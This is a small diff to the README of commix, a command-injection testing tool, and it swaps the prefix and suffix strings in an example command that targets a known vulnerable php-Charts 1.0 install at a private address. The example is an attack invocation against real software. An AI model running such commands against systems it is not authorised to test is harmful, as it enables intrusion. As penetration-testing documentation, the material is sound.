@@ -86,7 +86,7 @@ Download commix by cloning the Git repository:
     
 **Exploiting [php-Charts 1.0] (http://www.exploit-db.com/exploits/25496/) using injection payload suffix & prefix string:**
 
-    python commix.py --url="http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE" --prefix="//" --suffix="'" 
+    python commix.py --url="http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE" --prefix="'" --suffix="//"
     
 **Exploiting [OWASP Mutillidae] (https://www.owasp.org/index.php/Category:OWASP_Mutillidae) using Extra headers and HTTP proxy:**
 
